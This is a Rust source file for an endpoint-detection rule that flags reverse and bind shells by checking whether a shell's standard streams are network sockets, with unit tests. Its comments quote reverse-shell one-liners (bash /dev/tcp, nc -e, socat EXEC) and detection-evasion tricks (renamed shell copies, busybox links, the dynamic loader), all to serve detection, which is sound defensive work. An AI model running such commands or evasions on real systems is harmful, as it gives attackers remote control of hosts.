//! R020 — Shell or interpreter with its standard streams on a network
//! socket (lab PR 224, CM-03).
//!
//! MITRE T1059.004 (Command and Scripting Interpreter: Unix Shell) for the
//! shell, T1095 (Non-Application Layer Protocol) for its channel — ATT&CK
//! 20.0 ids of the pinned `docs/detection/attack-enterprise-20.0.tsv`
//! ([`Rule::attack`]).
//!
//! A reverse shell is a shell whose input and output are the network:
//! `bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh`, `socat …
//! EXEC:bash`, the Perl, Python, PHP and Ruby one-liners. The tools vary;
//! the shell's file table does not. The exec sensor reads, at
//! `sched_process_exec`, which of the new image's fds 0..2 are `AF_INET`
//! / `AF_INET6` sockets, whether one of them was connected out by a local
//! process (the connect kprobe recorded its socket), and the same for the
//! exec'ing task's parent (`Event::ProcessSpawn::stdio`).
//!
//! The rule fires, Critical, on an exec whose image
//! (by what the kernel executed, never `comm`) is a shell or an
//! interpreter and:
//!
//! 1. its stdin or stdout is an inet socket connected out — the reverse
//!    shell, whatever its parent;
//! 2. its stdin or stdout is an inet socket not seen connecting out (an
//!    accepted one: a bind shell; or a connect older than the agent),
//!    unless it was handed over by an inetd-style launcher: the parent is
//!    PID 1 (systemd socket activation, `Accept=yes`) or a launcher by
//!    exec identity ([`LAUNCHERS`]), or the parent's own stdio is the same
//!    kind of accepted socket (a socket-activated script running its
//!    commands);
//! 3. it is a shell, and its parent's stdin or stdout is an inet socket
//!    connected out — the reverse shell wrapped in a pty: the parent
//!    connected, `dup2`'d the socket onto 0..2 and spawned the shell on a
//!    pseudo-terminal (`pty.spawn`, `script`), so the shell's own fds are
//!    the pty.
//!
//! Its response, `KillProcessTree`, is held behind the per-rule response
//! policy ([`response_policy::R020_KILL`], off by default, decision of
//! 21/10/2026): until that policy enables it the verdict is a Critical
//! record, action `Log`, with the posture's `ConfirmedIntrusion`.
//!
//! The operator's `process-comm-allowlist` exempts a program, judged on
//! exec identity, as for R006/R007.
//!
//! Lot 313 (external bug hunt, edition 1.4: BUG-85, N1): the shell is
//! recognised by identity ([`program_identity::shell_or_interpreter`]): a
//! copy of an installed shell or interpreter under any name (`cp /bin/bash
//! ~/x`: the exec pump compares the running image with the installed
//! programs, byte for byte), an installed one by its device and inode (a
//! hard link, a bind mount), else by the executed file's name as before;
//! and busybox by the program its `argv` names, as busybox reads it
//! (`busybox sh`, `/bin/busybox sh`, the login shells `-sh` and `-ash`).
//! An exec of a user-writable image with its stdio on a socket — or a
//! parent's connected out, the pty-wrapped shape — whose content check the
//! exec pump skipped (its user's budget spent, or the image unreadable to
//! it) is recorded High, "identity unverified" — never silence (the review
//! of #549 and its re-check).
//!
//! Not covered (said so): a shell that is not byte-identical to an
//! installed program (rebuilt, patched, downloaded) and named otherwise; an
//! interpreter that `dup2`s a socket onto its
//! own stdio and runs no new image (a Python REPL over the socket); a
//! bind shell re-parented to PID 1 before its exec (double fork) — its
//! listener is still NN-L-NET-006/019's; a socket that is not on fds 0..2
//! (`socat` keeps it on its own fd and copies). A connect made before the
//! agent started is read as "not seen connecting out" (case 2).

use std::net::SocketAddr;
use std::sync::Arc;

use nn_model::{Event, ResponseAction, Severity, StdioSocket, Verdict};

use crate::config::comm_allowlist::{CommAllowlist, Judgement};
use crate::decision::attack::{AttackRef, Tactic};
use crate::decision::response_policy::{self, PolicySwitch};
use crate::decision::rules::program_identity;
use crate::decision::{rules::build_verdict, Rule};
use crate::posture::host::PostureHost;
use crate::posture::lineage::AuthSessionTracker;

/// Shells and interpreters: the rules' one list ([`program_identity`]).
pub use crate::decision::rules::program_identity::{INTERPRETERS, SHELLS};

/// Programs that hand an accepted connection to a service on its stdio
/// (inetd style). PID 1 counts as systemd without a lookup.
pub const LAUNCHERS: &[&str] = &[
    "systemd",
    "inetd",
    "xinetd",
    "tcpserver",
    "s6-tcpserver",
    "s6-tcpserver4",
    "s6-tcpserver6",
    "tcpsvd",
    "in.rshd",
    "in.rexecd",
];

/// Which of the three shapes (module docs) an exec has.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StdioShellShape {
    /// Case 1: own stdin/stdout on a socket connected out.
    Outbound,
    /// Case 2: own stdin/stdout on a socket not seen connecting out, from
    /// a parent that is no launcher.
    NotLaunched,
    /// Case 3: a shell whose parent's stdin/stdout is a socket connected
    /// out.
    ParentOutbound,
}

impl StdioShellShape {
    /// For the detection record's `network` field.
    pub fn direction(&self) -> &'static str {
        match self {
            Self::Outbound | Self::ParentOutbound => "outbound",
            Self::NotLaunched => "inbound",
        }
    }
}

/// The shape of a `ProcessSpawn`, `None` when it is none of them.
/// `lineage` names the parent (the inetd-launcher exemption); without it
/// only PID 1 counts as a launcher.
pub fn shape<H: PostureHost>(
    event: &Event,
    lineage: Option<&AuthSessionTracker<H>>,
) -> Option<StdioShellShape> {
    let Event::ProcessSpawn { ppid, stdio, .. } = event else {
        return None;
    };
    if !stdio.own.stdin_or_stdout_inet() && !stdio.parent.stdin_or_stdout_inet() {
        return None;
    }
    // lot 313 (BUG-85, N1): by identity, busybox by the program it runs
    let is_shell = program_identity::shell_or_interpreter(event)?;
    if stdio.own.stdin_or_stdout_inet() {
        if stdio.own.outbound {
            return Some(StdioShellShape::Outbound);
        }
        if *ppid == 1
            || parent_is_launcher(
                *ppid,
                lineage,
                crate::posture::lineage::AsOf::of_event(event),
            )
            || (stdio.parent.stdin_or_stdout_inet() && !stdio.parent.outbound)
        {
            return None;
        }
        return Some(StdioShellShape::NotLaunched);
    }
    (is_shell && stdio.parent.outbound).then_some(StdioShellShape::ParentOutbound)
}

fn parent_is_launcher<H: PostureHost>(
    ppid: u32,
    lineage: Option<&AuthSessionTracker<H>>,
    as_of: crate::posture::lineage::AsOf,
) -> bool {
    let Some(id) = lineage.and_then(|l| l.exec_identity(ppid, as_of)) else {
        return false;
    };
    let exe = id.exe.to_string_lossy();
    crate::posture::lineage::in_system_tree(&exe)
        && LAUNCHERS
            .iter()
            .any(|l| program_identity::program_is(program_identity::base_of(&exe), l))
}

/// `stdio tcp 127.0.0.1:44401 outbound`, for the detection record and the
/// reasoning: the socket the shape was read on.
pub fn network_text(event: &Event, shape: StdioShellShape) -> Option<String> {
    let Event::ProcessSpawn { stdio, .. } = event else {
        return None;
    };
    let (label, sock): (&str, &StdioSocket) = match shape {
        StdioShellShape::ParentOutbound => ("parent-stdio", &stdio.parent),
        _ => ("stdio", &stdio.own),
    };
    Some(format!(
        "{label} {} {} {}",
        sock.proto_name(),
        peer_text(sock.peer),
        shape.direction()
    ))
}

fn peer_text(peer: Option<SocketAddr>) -> String {
    peer.map_or_else(|| "?".to_string(), |p| p.to_string())
}

pub struct R020ShellWithSocketStdio<H: PostureHost> {
    allowlist: Arc<CommAllowlist<H>>,
    lineage: Option<AuthSessionTracker<H>>,
    /// The kill of the tree, held behind the per-rule policy
    /// ([`response_policy::R020_KILL`], off by default): Critical, recorded,
    /// posture `ConfirmedIntrusion`, action `Log`.
    kill: PolicySwitch,
}

impl<H: PostureHost> R020ShellWithSocketStdio<H> {
    /// Lot 313 (the coordinator's fail-safe for the content check's
    /// budget): an exec of a user-writable image (not in a system tree, by
    /// the kernel's path) with its stdin or stdout on an inet socket, whose
    /// running image the exec pump did not compare — a flood spent the
    /// second's budget ([`program_identity::unverified`]) — is recorded
    /// High, "identity unverified": a flood followed by a renamed shell is
    /// never silence.
    fn unverified(&self, event: &Event) -> Option<Verdict> {
        let Event::ProcessSpawn {
            filename,
            exe,
            stdio,
            ..
        } = event
        else {
            return None;
        };
        // the socket where a reverse shell puts it: its own stdio, or (the
        // re-check of #549, R1) its parent's, connected out — the pty
        // master's holder of case 3
        let own = stdio.own.stdin_or_stdout_inet();
        let parent = stdio.parent.stdin_or_stdout_inet() && stdio.parent.outbound;
        if !(own || parent)
            || !program_identity::unverified(event)
            || program_identity::exec_in_system_tree(event)
        {
            return None;
        }
        if super::judge_spawn(&self.allowlist, event) == Judgement::Allowed {
            return None;
        }
        let image = exe.path_or(filename);
        Some(build_verdict(
            self,
            event,
            ResponseAction::Log,
            Severity::High,
            &format!(
                "{image} (a file a user can write) started with {} — its identity \
                 unverified: the exec pump did not compare it with the installed shells (its \
                 budget spent by a flood of execs, or the image unreadable to it: lot 313); \
                 recorded",
                if own {
                    format!(
                        "stdin/stdout on a {} socket (peer {})",
                        stdio.own.proto_name(),
                        peer_text(stdio.own.peer)
                    )
                } else {
                    format!(
                        "a parent whose stdin/stdout is a {} socket connected out to {}",
                        stdio.parent.proto_name(),
                        peer_text(stdio.parent.peer)
                    )
                }
            ),
        ))
    }

    pub fn new(allowlist: Arc<CommAllowlist<H>>, lineage: Option<AuthSessionTracker<H>>) -> Self {
        Self {
            allowlist,
            lineage,
            kill: response_policy::R020_KILL,
        }
    }

    /// This rule with its kill switch set to `kill` (tests; the per-rule
    /// policy in Phase 2).
    pub fn with_kill(self, kill: PolicySwitch) -> Self {
        Self { kill, ..self }
    }
}

impl<H: PostureHost> Rule for R020ShellWithSocketStdio<H> {
    fn id(&self) -> &'static str {
        "R020_ShellWithSocketStdio"
    }
    fn name(&self) -> &'static str {
        "Shell or interpreter with stdin/stdout on a network socket"
    }
    fn category(&self) -> &'static str {
        "execution"
    }
    fn attack(&self) -> &'static [AttackRef] {
        // A shell on a network socket: the shell, and the raw channel its
        // standard streams are (as R006).
        const ATTACK: &[AttackRef] = &[
            AttackRef::new(Tactic::Execution, "T1059.004"),
            AttackRef::new(Tactic::CommandAndControl, "T1095"),
        ];
        ATTACK
    }

    fn evaluate(&self, event: &Event) -> Option<Verdict> {
        let Some(shape) = shape(event, self.lineage.as_ref()) else {
            return self.unverified(event);
        };
        if super::judge_spawn(&self.allowlist, event) == Judgement::Allowed {
            return None;
        }
        let Event::ProcessSpawn {
            filename,
            exe,
            stdio,
            ..
        } = event
        else {
            return None;
        };
        let image = exe.path_or(filename);
        let reasoning = match shape {
            StdioShellShape::Outbound => format!(
                "{image} started with stdin/stdout on a {} socket it or an ancestor connected \
                 out to {} — a reverse shell (T1059.004; channel T1095); kill the process \
                 tree",
                stdio.own.proto_name(),
                peer_text(stdio.own.peer)
            ),
            StdioShellShape::NotLaunched => format!(
                "{image} started with stdin/stdout on a {} socket (peer {}) not seen \
                 connecting out and not handed over by an inetd-style launcher — a bind shell, \
                 or a reverse shell connected before the agent started (T1059.004); kill the \
                 process tree",
                stdio.own.proto_name(),
                peer_text(stdio.own.peer)
            ),
            StdioShellShape::ParentOutbound => format!(
                "shell {image} spawned by a process whose stdin/stdout is a {} socket connected \
                 out to {} — a reverse shell wrapped in a pseudo-terminal (the socket dup2'd \
                 onto the parent's stdio, T1059.004); kill the process tree",
                stdio.parent.proto_name(),
                peer_text(stdio.parent.peer)
            ),
        };
        Some(self.kill.hold(build_verdict(
            self,
            event,
            ResponseAction::KillProcessTree,
            Severity::Critical,
            &reasoning,
        )))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    // R08b (lab PR 251): on the portable test host.
    use crate::posture::host::testing::TestHost as H;
    type CommAllowlist = crate::config::comm_allowlist::CommAllowlist<H>;
    type AuthSessionTracker = crate::posture::lineage::AuthSessionTracker<H>;
    type R020ShellWithSocketStdio = super::R020ShellWithSocketStdio<H>;
    use crate::decision::rules::testutil::spawn_exe;
    use nn_model::{StdioSocket, StdioSockets};
    fn shape(event: &Event, lineage: Option<&AuthSessionTracker>) -> Option<StdioShellShape> {
        super::shape::<H>(event, lineage)
    }

    fn sock(outbound: bool, fds: u8, peer: &str) -> StdioSocket {
        StdioSocket {
            read: true,
            inet_fds: fds,
            outbound,
            proto: 6,
            peer: Some(peer.parse().unwrap()),
        }
    }

    fn with_stdio(mut e: Event, own: StdioSocket, parent: StdioSocket, ppid: u32) -> Event {
        if let Event::ProcessSpawn { stdio, ppid: p, .. } = &mut e {
            *stdio = StdioSockets { own, parent };
            *p = ppid;
        }
        e
    }

    fn rule() -> R020ShellWithSocketStdio {
        R020ShellWithSocketStdio::new(Arc::new(CommAllowlist::default()), None)
    }

    fn bash() -> Event {
        spawn_exe("bash", "/bin/bash", "/usr/bin/bash", 0)
    }

    /// MS-06: `bash -i >& /dev/tcp/127.0.0.1/44401 0>&1` — the shell's
    /// stdio is the socket its parent connected.
    #[test]
    fn a_shell_on_an_outbound_socket_is_a_critical_reverse_shell() {
        let e = with_stdio(
            bash(),
            sock(true, 0b111, "127.0.0.1:44401"),
            StdioSocket::default(),
            4000,
        );
        let v = rule().evaluate(&e).expect("fires");
        assert_eq!(v.rule_id, "R020_ShellWithSocketStdio");
        assert_eq!(v.severity, Severity::Critical);
        // The kill is held behind the per-rule policy, off by default.
        assert_eq!(v.action, ResponseAction::Log);
        assert!(
            v.reasoning.contains("[held back: the kill"),
            "{}",
            v.reasoning
        );
        assert!(v.reasoning.contains("127.0.0.1:44401"), "{}", v.reasoning);
        // With the switch on (Phase 2's per-rule policy), the tree is killed.
        let on = rule().with_kill(response_policy::R020_KILL.enabled());
        let k = on.evaluate(&e).expect("fires");
        assert_eq!(k.action, ResponseAction::KillProcessTree);
        assert!(!k.reasoning.contains("held back"), "{}", k.reasoning);
        assert_eq!(
            network_text(&e, shape(&e, None).unwrap()).as_deref(),
            Some("stdio tcp 127.0.0.1:44401 outbound")
        );
        // Even from PID 1 (a double fork): the socket was connected out.
        let e = with_stdio(
            bash(),
            sock(true, 0b011, "127.0.0.1:44401"),
            StdioSocket::default(),
            1,
        );
        assert!(rule().evaluate(&e).is_some());
    }

    /// The same on the starting tree's record shape: no stdio read, no
    /// verdict (the exec sensor of an older eBPF object).
    #[test]
    fn an_unread_file_table_is_never_a_socket() {
        let e = bash();
        assert!(rule().evaluate(&e).is_none());
        let mut unread = sock(true, 0b111, "127.0.0.1:1");
        unread.read = false;
        let e = with_stdio(bash(), unread, StdioSocket::default(), 4000);
        assert!(rule().evaluate(&e).is_none());
    }

    /// stderr alone on a socket is not the shell's input or output.
    #[test]
    fn stderr_alone_is_not_enough() {
        let e = with_stdio(
            bash(),
            sock(true, 0b100, "127.0.0.1:44401"),
            StdioSocket::default(),
            4000,
        );
        assert!(rule().evaluate(&e).is_none());
    }

    /// MS-06N: systemd `Accept=yes` hands the accepted socket to the
    /// service (PID 1 its parent), and the service's script runs commands
    /// with the socket inherited: neither fires. A bind shell from `nc`
    /// does.
    #[test]
    fn an_inetd_style_service_is_not_a_bind_shell_a_bind_shell_is() {
        let inbound = sock(false, 0b011, "127.0.0.1:52000");
        let launched = with_stdio(bash(), inbound, StdioSocket::default(), 1);
        assert!(rule().evaluate(&launched).is_none());
        let script_child = with_stdio(
            spawn_exe("python3", "/usr/bin/python3", "/usr/bin/python3.12", 0),
            inbound,
            inbound,
            5000,
        );
        assert!(rule().evaluate(&script_child).is_none());
        let bind = with_stdio(bash(), inbound, StdioSocket::default(), 5000);
        let v = rule().evaluate(&bind).expect("a bind shell fires");
        assert_eq!(v.severity, Severity::Critical);
        assert_eq!(
            network_text(&bind, shape(&bind, None).unwrap()).as_deref(),
            Some("stdio tcp 127.0.0.1:52000 inbound")
        );
    }

    /// An inetd launcher by exec identity exempts its accepted socket.
    #[test]
    fn a_launcher_parent_by_identity_exempts_an_accepted_socket() {
        let tmp = tempfile::TempDir::new().unwrap();
        let l = AuthSessionTracker::new(tmp.path());
        l.ingest_spawn_with_argv(6000, 1, "/usr/sbin/xinetd", &["/usr/sbin/xinetd".into()], 1);
        let r = R020ShellWithSocketStdio::new(Arc::new(CommAllowlist::default()), Some(l));
        let e = with_stdio(
            bash(),
            sock(false, 0b011, "127.0.0.1:52000"),
            StdioSocket::default(),
            6000,
        );
        assert!(r.evaluate(&e).is_none());
    }

    /// MS-06B: Python connects, dup2's the socket onto 0..2 and spawns
    /// `/bin/sh` on a pty: the shell's parent holds the socket.
    #[test]
    fn a_pty_wrapped_reverse_shell_fires_on_the_shell() {
        let e = with_stdio(
            spawn_exe("sh", "/bin/sh", "/usr/bin/dash", 0),
            StdioSocket {
                read: true,
                ..Default::default()
            },
            sock(true, 0b111, "127.0.0.1:44402"),
            7000,
        );
        let v = rule().evaluate(&e).expect("fires");
        assert!(v.reasoning.contains("pseudo-terminal"), "{}", v.reasoning);
        assert_eq!(
            network_text(&e, shape(&e, None).unwrap()).as_deref(),
            Some("parent-stdio tcp 127.0.0.1:44402 outbound")
        );
        // An interpreter child of such a parent is not this shape.
        let e = with_stdio(
            spawn_exe("python3", "/usr/bin/python3", "/usr/bin/python3.12", 0),
            StdioSocket::default(),
            sock(true, 0b111, "127.0.0.1:44402"),
            7000,
        );
        assert!(rule().evaluate(&e).is_none());
    }

    /// The image is what the kernel executed: a program named `bash` is
    /// not a shell, `/usr/bin/perl` is an interpreter, busybox's `sh` is a
    /// shell; `cat` on a socket (an inetd echo service) is none.
    #[test]
    fn the_image_decides_not_the_comm() {
        let out = sock(true, 0b011, "127.0.0.1:44401");
        let none = StdioSocket::default();
        let fake = with_stdio(
            spawn_exe("bash", "/usr/bin/cat", "/usr/bin/cat", 0),
            out,
            none,
            9,
        );
        assert!(rule().evaluate(&fake).is_none());
        let perl = with_stdio(
            spawn_exe("x", "/usr/bin/perl", "/usr/bin/perl5.38", 0),
            out,
            none,
            9,
        );
        assert!(rule().evaluate(&perl).is_some());
        let mut bb = with_stdio(
            spawn_exe("sh", "/bin/sh", "/usr/bin/busybox", 0),
            out,
            none,
            9,
        );
        if let Event::ProcessSpawn { argv, .. } = &mut bb {
            *argv = vec!["sh".into(), "-i".into()];
        }
        assert!(rule().evaluate(&bb).is_some());
    }

    /// The operator's allowlist exempts a program by identity.
    #[test]
    fn the_process_allowlist_exempts_by_identity() {
        let r = R020ShellWithSocketStdio::new(
            Arc::new(CommAllowlist::from_iter_owned(["bash".to_string()])),
            None,
        );
        let e = with_stdio(
            bash(),
            sock(true, 0b011, "127.0.0.1:44401"),
            StdioSocket::default(),
            4000,
        );
        assert!(r.evaluate(&e).is_none());
    }
}

/// Lot 313 (external bug hunt, edition 1.4: BUG-85): busybox picks its applet from `argv[0]`
/// less a leading `-` (a login shell), and, run under its own name, from
/// the next argument (`busybox sh`). R020 reads `argv[0]` only.
#[cfg(test)]
mod bug85 {
    use super::*;
    use crate::decision::rules::program_identity;
    use crate::decision::rules::testutil::spawn_exe;
    use crate::posture::host::testing::TestHost as H;
    use nn_model::{StdioSocket, StdioSockets};

    fn sock(outbound: bool, fds: u8, peer: &str) -> StdioSocket {
        StdioSocket {
            read: true,
            inet_fds: fds,
            outbound,
            proto: 6,
            peer: Some(peer.parse().unwrap()),
        }
    }

    fn busybox(argv: &[&str], own: StdioSocket, parent: StdioSocket) -> Event {
        let mut e = spawn_exe("busybox", "/bin/busybox", "/bin/busybox", 0);
        if let Event::ProcessSpawn {
            stdio,
            ppid,
            argv: a,
            ..
        } = &mut e
        {
            *stdio = StdioSockets { own, parent };
            *ppid = 4000;
            *a = argv.iter().map(|s| s.to_string()).collect();
        }
        e
    }

    fn rule() -> R020ShellWithSocketStdio<H> {
        R020ShellWithSocketStdio::new(Arc::new(CommAllowlist::<H>::default()), None)
    }

    #[test]
    fn bug85_busybox_sh_on_an_outbound_socket_is_a_reverse_shell() {
        let out = sock(true, 0b011, "127.0.0.1:44401");
        let mut missed = Vec::new();
        for argv in [
            &["busybox", "sh", "-i"][..],
            &["/bin/busybox", "sh"][..],
            &["-sh"][..],
            &["-ash"][..],
            // lot 313: a link named for its shell, busybox's own spellings
            &["/home/u/sh", "-i"][..],
            &["busybox.static", "sh"][..],
            &["busybox", "busybox", "sh"][..],
        ] {
            let e = busybox(argv, out, StdioSocket::default());
            if shape::<H>(&e, None) != Some(StdioShellShape::Outbound)
                || rule().evaluate(&e).is_none()
            {
                missed.push(argv.join(" "));
            }
        }
        assert!(
            missed.is_empty(),
            "busybox running a shell on an outbound socket: no R020 verdict for {missed:?}"
        );
    }

    #[test]
    fn bug85_busybox_sh_wrapped_in_a_pty_is_case_3() {
        let own = StdioSocket {
            read: true,
            ..Default::default()
        };
        let e = busybox(
            &["busybox", "sh"],
            own,
            sock(true, 0b111, "127.0.0.1:44402"),
        );
        assert_eq!(
            shape::<H>(&e, None),
            Some(StdioShellShape::ParentOutbound),
            "busybox sh under a pty whose parent holds the outbound socket"
        );
    }

    /// N1 (the triage, beyond the card; same root: the shell told by the
    /// image's basename): a copy of a shell under another name, in a
    /// directory the user writes, was no shell to R020 (`cp /bin/bash
    /// ~/x`). The exec pump found the running image to be a copy of the
    /// installed bash (`nn_linux::program_images`, its own test) and kept
    /// it for the exec; R020 reads that.
    #[test]
    fn n1_a_renamed_copy_of_a_shell_is_a_shell() {
        let out = sock(true, 0b011, "127.0.0.1:44401");
        let mut e = spawn_exe("x", "/home/u/x", "/home/u/x", 0);
        if let Event::ProcessSpawn {
            stdio,
            ppid,
            argv,
            pid,
            timestamp_ns,
            ..
        } = &mut e
        {
            *stdio = StdioSockets {
                own: out,
                parent: StdioSocket::default(),
            };
            *ppid = 4000;
            *pid = 313_085;
            *timestamp_ns = 313_085;
            *argv = vec!["x".into(), "-i".into()];
        }
        program_identity::keep_copy(&e, program_identity::ProgramKind::Shell);
        assert_eq!(
            shape::<H>(&e, None),
            Some(StdioShellShape::Outbound),
            "a copy of bash named x, stdio on an outbound socket"
        );
        let v = rule().evaluate(&e).expect("a reverse shell");
        assert_eq!(v.severity, Severity::Critical);
    }

    /// Lot 313: an installed shell by its identity — a hard link or a bind
    /// mount of bash under another name, and busybox's file (Alpine's
    /// `/bin/sh` is a link to it: the kernel runs `/bin/busybox`) whatever
    /// it is named, running the shell its `argv` names.
    #[test]
    fn an_installed_shell_under_another_name_is_a_shell() {
        let out = sock(true, 0b011, "127.0.0.1:44401");
        let bash = (0x0fd0_0313, 85_001);
        let bb = (0x0fd0_0313, 85_002);
        for (id, kind, len) in [
            (bash, program_identity::ProgramKind::Shell, 1_446_024),
            (bb, program_identity::ProgramKind::Busybox, 1_000_000),
        ] {
            program_identity::record_installed(program_identity::InstalledImage {
                id,
                len,
                path: "/usr/bin/x".into(),
                kind,
            });
        }
        let at = |path: &str, id: (u64, u64), argv: &[&str]| {
            let mut e = spawn_exe("x", path, path, 0);
            if let Event::ProcessSpawn {
                stdio,
                ppid,
                argv: a,
                exe,
                ..
            } = &mut e
            {
                *stdio = StdioSockets {
                    own: out,
                    parent: StdioSocket::default(),
                };
                *ppid = 4000;
                *a = argv.iter().map(|s| s.to_string()).collect();
                (exe.dev, exe.ino) = id;
            }
            shape::<H>(&e, None)
        };
        assert_eq!(
            at("/home/u/.cache/x", bash, &["x", "-i"]),
            Some(StdioShellShape::Outbound)
        );
        // busybox through a link named for its shell (`ln -s /bin/busybox
        // ~/sh`: the kernel runs busybox, `argv[0]` names `sh`)
        assert_eq!(
            at("/home/u/x", bb, &["/home/u/sh", "-i"]),
            Some(StdioShellShape::Outbound)
        );
        assert_eq!(
            at("/home/u/x", bb, &["x", "sh"]),
            None,
            "busybox runs `x`: no such program"
        );
    }

    /// Guards: busybox started through its `sh` link is a shell already;
    /// a busybox applet that is no shell stays no shape.
    #[test]
    fn bug85_guards() {
        let out = sock(true, 0b011, "127.0.0.1:44401");
        let e = busybox(&["sh", "-i"], out, StdioSocket::default());
        assert_eq!(shape::<H>(&e, None), Some(StdioShellShape::Outbound));
        for argv in [&["busybox", "nc", "h", "1"][..], &["busybox", "cat"][..]] {
            let e = busybox(argv, out, StdioSocket::default());
            assert_eq!(shape::<H>(&e, None), None, "{argv:?}");
        }
    }
}

/// Lot 313 (the review of #549, F4): a shell run through the dynamic
/// loader (`/lib64/ld-linux-x86-64.so.2 /bin/bash -i`): the kernel executed
/// the loader (comm `ld-linux-x86-64`), which runs its operand — that
/// program is what R020 judges.
#[cfg(test)]
mod review549 {
    use super::*;
    use crate::decision::rules::testutil::spawn_exe;
    use crate::posture::host::testing::TestHost as H;
    use nn_model::{StdioSocket, StdioSockets};

    fn through_loader(loader: &str, argv: &[&str]) -> Event {
        let mut e = spawn_exe("ld-linux-x86-64", loader, loader, 0);
        if let Event::ProcessSpawn {
            stdio,
            ppid,
            argv: a,
            ..
        } = &mut e
        {
            *stdio = StdioSockets {
                own: StdioSocket {
                    read: true,
                    inet_fds: 0b011,
                    outbound: true,
                    proto: 6,
                    peer: Some("127.0.0.1:44401".parse().unwrap()),
                },
                parent: StdioSocket::default(),
            };
            *ppid = 4000;
            *a = argv.iter().map(|s| s.to_string()).collect();
        }
        e
    }

    #[test]
    fn review549_a_shell_through_the_dynamic_loader_is_a_shell() {
        let rule =
            R020ShellWithSocketStdio::<H>::new(Arc::new(CommAllowlist::<H>::default()), None);
        for (loader, argv) in [
            (
                "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
                &["/lib64/ld-linux-x86-64.so.2", "/bin/bash", "-i"][..],
            ),
            (
                "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
                &["ld.so", "--library-path", "/x", "--argv0", "y", "/bin/sh"],
            ),
            (
                "/lib/ld-musl-x86_64.so.1",
                &["ld-musl-x86_64.so.1", "/bin/busybox", "sh"],
            ),
            (
                "/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2",
                &["ld.so", "--", "/usr/bin/python3"],
            ),
        ] {
            let e = through_loader(loader, argv);
            assert_eq!(
                shape::<H>(&e, None),
                Some(StdioShellShape::Outbound),
                "{argv:?}"
            );
            assert!(rule.evaluate(&e).is_some(), "{argv:?}");
        }
        // guards: a program that is no shell; the loader's own query
        for argv in [
            &["ld.so", "/usr/bin/id"][..],
            &["ld.so", "--list", "/usr/bin/id"],
            &["ld.so", "--help"],
            &["ld.so"],
        ] {
            let e = through_loader("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2", argv);
            assert_eq!(shape::<H>(&e, None), None, "{argv:?}");
        }
    }
}

/// Lot 313 (the coordinator's fail-safe): when the exec pump skips the
/// content check (its budget spent by a flood), a user-writable image with
/// its stdio on a socket is recorded High, "identity unverified" — never
/// silence; an image of a system tree, a compared one and one without a
/// socket are not.
#[cfg(test)]
mod unverified_identity {
    use super::*;
    use crate::decision::rules::testutil::spawn_exe;
    use crate::posture::host::testing::TestHost as H;
    use nn_model::{StdioSocket, StdioSockets};

    fn exec(pid: u32, path: &str, socket: bool) -> Event {
        let mut e = spawn_exe("x", path, path, 0);
        if let Event::ProcessSpawn {
            pid: p,
            timestamp_ns,
            stdio,
            argv,
            ..
        } = &mut e
        {
            (*p, *timestamp_ns) = (pid, u64::from(pid));
            *argv = vec!["x".into(), "-i".into()];
            if socket {
                *stdio = StdioSockets {
                    own: StdioSocket {
                        read: true,
                        inet_fds: 0b011,
                        outbound: true,
                        proto: 6,
                        peer: Some("127.0.0.1:44401".parse().unwrap()),
                    },
                    parent: StdioSocket::default(),
                };
            }
        }
        e
    }

    #[test]
    fn a_skipped_compare_is_recorded_never_silent() {
        let rule =
            R020ShellWithSocketStdio::<H>::new(Arc::new(CommAllowlist::<H>::default()), None);
        let flood = exec(313_601, "/home/u/x", true);
        assert!(
            rule.evaluate(&flood).is_none(),
            "compared (or no budget asked): nothing"
        );
        program_identity::keep_unverified(&flood);
        let v = rule.evaluate(&flood).expect("identity unverified");
        assert_eq!(
            (v.action, v.severity),
            (ResponseAction::Log, Severity::High)
        );
        assert!(
            v.reasoning.contains("identity unverified"),
            "{}",
            v.reasoning
        );
        // guards: no socket; a system tree's image
        let quiet = exec(313_602, "/home/u/x", false);
        program_identity::keep_unverified(&quiet);
        assert!(rule.evaluate(&quiet).is_none());
        let system = exec(313_603, "/usr/lib/x/tool", true);
        program_identity::keep_unverified(&system);
        assert!(rule.evaluate(&system).is_none());
        // the re-check of #549 (R1 b): the pty-wrapped case — its own stdio
        // a pty, its parent's the socket connected out
        let mut pty = exec(313_605, "/home/u/x", false);
        if let Event::ProcessSpawn { stdio, .. } = &mut pty {
            stdio.own = StdioSocket {
                read: true,
                ..Default::default()
            };
            stdio.parent = StdioSocket {
                read: true,
                inet_fds: 0b111,
                outbound: true,
                proto: 6,
                peer: Some("127.0.0.1:44402".parse().unwrap()),
            };
        }
        assert!(rule.evaluate(&pty).is_none(), "not asked: nothing");
        program_identity::keep_unverified(&pty);
        let v = rule
            .evaluate(&pty)
            .expect("the pty-wrapped copy, unverified");
        assert_eq!(v.severity, Severity::High);
        assert!(
            v.reasoning.contains("a parent whose stdin/stdout"),
            "{}",
            v.reasoning
        );
        // a compared copy is verified: a copy of busybox running its `cat`
        // is no shell, and no unverified identity either
        let mut cat = exec(313_604, "/home/u/bb", true);
        if let Event::ProcessSpawn { argv, .. } = &mut cat {
            *argv = vec!["cat".into()];
        }
        program_identity::keep_copy(&cat, program_identity::ProgramKind::Busybox);
        assert!(!program_identity::unverified(&cat));
        assert!(rule.evaluate(&cat).is_none());
    }
}
